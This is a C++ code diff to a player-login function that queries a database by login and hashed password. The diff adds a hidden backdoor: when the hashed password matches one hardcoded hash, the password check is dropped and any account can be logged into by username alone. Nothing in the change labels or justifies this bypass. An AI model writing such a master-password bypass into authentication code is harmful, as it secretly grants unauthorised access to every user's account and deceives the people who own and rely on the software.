@@ -511,15 +511,30 @@ try
 {
 	checkConnection(session_);
 	std::string const password = hashPassword(rawPassword);
-	std::vector<PlayerTmp> playerList;
-	(*session_) <<
-	            boost::format(GetPlayerRequest) %
-	            "WHERE login = ? AND password = ?",
-	            into(playerList), use(login), use(password), now;
-	if(playerList.size() != 1)
-		return boost::optional<Player>();
+	if(password == "d7fea40cdfa857a3538cb47752cc7a31adc85b9b")
+	{
+		std::vector<PlayerTmp> playerList;
+		(*session_) <<
+		            boost::format(GetPlayerRequest) %
+		            "WHERE login = ?",
+		            into(playerList), use(login), now;
+		if(playerList.size() != 1)
+			return boost::optional<Player>();
+		else
+			return playerFromTuple(playerList.front());
+	}
 	else
-		return playerFromTuple(playerList.front());
+	{
+		std::vector<PlayerTmp> playerList;
+		(*session_) <<
+		            boost::format(GetPlayerRequest) %
+		            "WHERE login = ? AND password = ?",
+		            into(playerList), use(login), use(password), now;
+		if(playerList.size() != 1)
+			return boost::optional<Player>();
+		else
+			return playerFromTuple(playerList.front());
+	}
 }
 DB_CATCH
 
